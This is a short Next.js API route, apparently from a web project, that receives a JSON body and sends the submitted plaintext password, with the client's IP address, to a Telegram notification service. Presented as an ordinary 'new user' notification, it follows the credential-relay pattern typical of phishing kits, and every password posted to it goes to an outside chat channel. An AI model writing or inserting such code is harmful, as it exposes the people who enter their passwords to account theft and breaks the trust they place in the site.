import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"
import { getClientIp } from "@/lib/request-ip"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const ip = getClientIp(request)
    await telegramService.sendNewUserPasswordNotification(data.password, ip)
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending new user password notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
